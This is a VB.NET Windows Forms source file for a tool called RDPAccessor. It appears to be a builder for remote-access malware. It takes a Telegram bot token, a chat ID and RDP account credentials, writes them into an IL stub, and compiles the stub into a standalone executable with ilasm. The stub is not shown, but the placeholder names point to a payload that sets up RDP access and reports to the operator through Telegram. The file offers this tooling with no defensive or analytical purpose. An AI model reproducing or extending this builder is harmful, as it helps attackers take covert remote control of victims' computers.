Imports System
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Text
Imports System.Threading.Tasks
Imports System.Windows.Forms

Namespace RDPAccessor
    Public Partial Class Form1
        Inherits Form
        Public Sub New()
            InitializeComponent()
        End Sub

        Private Sub Form1_MouseDown(sender As Object, e As MouseEventArgs)
            Capture = False
            Dim msg = Message.Create(Handle, &Ha1, New IntPtr(2), IntPtr.Zero)
            WndProc(msg)
        End Sub

        Private Sub closeBtn_Click(sender As Object, e As EventArgs)
            Call Application.Exit()
        End Sub

        Private Sub minimazeBtn_Click(sender As Object, e As EventArgs)
            WindowState = FormWindowState.Minimized
        End Sub

        Private Async Sub buildBtn_Click(sender As Object, e As EventArgs)
            Dim tokenBot = botTokenBox.Text, chatId = chatidBox.Text, username = accUsernameBox.Text, password = accPasswdBox.Text

            If String.IsNullOrEmpty(tokenBot) OrElse String.IsNullOrEmpty(chatId) OrElse String.IsNullOrEmpty(username) OrElse String.IsNullOrEmpty(password) Then
                SetStatusLabel("Error - forms cannot be empty!", Color.Red)
            Else
                Dim stubPath = "stub", stubName = "stub.il", ilasmPath = "compilator\ilasm.exe", stubFilePath = Path.Combine(stubPath, stubName)

                If Directory.Exists(stubPath) AndAlso File.Exists(stubFilePath) Then
                    Dim ilCode = File.ReadAllText(stubFilePath)
                    ilCode = ReplaceTokens(ilCode, tokenBot, chatId, username, password)

                    Dim tempFilePath = Path.Combine(stubPath, "stubtemp.il")
                    File.WriteAllText(tempFilePath, ilCode, Encoding.UTF8)

                    Dim saveFileDialog As SaveFileDialog = New SaveFileDialog()
                    saveFileDialog.Filter = "Executable files (*.exe)|*.exe|All files (*.*)|*.*"
                    saveFileDialog.Title = "Save the built executable file"

                    If saveFileDialog.ShowDialog() = DialogResult.OK Then
                        Dim exeOutputPath = saveFileDialog.FileName

                        If File.Exists(ilasmPath) Then
                            CompileIlCode(ilasmPath, tempFilePath, exeOutputPath)
                        Else
                            SetStatusLabel("Error - ilasm.exe not found", Color.Red)
                        End If
                    Else
                        SetStatusLabel("Build Canceled", Color.Red)
                    End If

                    File.Delete(tempFilePath)
                Else
                    SetStatusLabel("Error - Not found required files and folders!", Color.Red)
                End If
            End If
        End Sub

        Private Sub SetStatusLabel(text As String, color As Color)
            statusLabel.ForeColor = color
            statusLabel.Text = "Status: " & text
            Call Task.Delay(3000).Wait()
            statusLabel.ForeColor = Color.Black
            statusLabel.Text = "Status: Idle"
            ClearTextBoxes()
        End Sub

        Private Sub ClearTextBoxes()
            botTokenBox.Clear()
            chatidBox.Clear()
            accUsernameBox.Clear()
            accPasswdBox.Clear()
        End Sub

        Private Function ReplaceTokens(ilCode As String, tokenBot As String, chatId As String, username As String, password As String) As String
            Return ilCode.Replace("TOKENBOT", tokenBot).Replace("CHATIDUSER", chatId).Replace("RDPUSERNAME", username).Replace("RDPPASSWORD", password)
        End Function

        Private Sub CompileIlCode(ilasmPath As String, tempFilePath As String, exeOutputPath As String)
            Dim process As Process = New Process()
            process.StartInfo.FileName = ilasmPath
            process.StartInfo.Arguments = $"""{tempFilePath}"" /output=""{exeOutputPath}"""
            process.StartInfo.UseShellExecute = False
            process.StartInfo.RedirectStandardOutput = True
            process.StartInfo.CreateNoWindow = True
            process.Start()

            process.WaitForExit()

            If File.Exists(exeOutputPath) Then
                SetStatusLabel("Build Successful", Color.Black)
                Process.Start("explorer.exe", $"/select,""{exeOutputPath}""")
            Else
                SetStatusLabel("Error - Compilation failed", Color.Red)
            End If
        End Sub
    End Class
End Namespace
